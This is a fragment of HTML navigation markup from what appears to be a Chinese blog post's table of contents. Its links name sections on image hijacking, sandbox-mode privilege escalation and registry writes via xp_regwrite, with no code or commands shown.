nav-level-3"><a class="nav-link" href="#4-映像劫持"><span class="nav-number">6.3.4.</span> <span class="nav-text">4.映像劫持</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-沙盒模式提权："><span class="nav-number">6.3.5.</span> <span class="nav-text">5.沙盒模式提权：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#法a："><span class="nav-number">6.3.5.1.</span> <span class="nav-text">法a：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#法b："><span class="nav-number">6.3.5.2.</span> <span class="nav-text">法b：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-xp-regwrite操作注册表"><span class="nav-number">6.3.6.</span> <span class="nav-text">6.xp_regwrite操作注册表</span></a></li></ol></li></ol></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
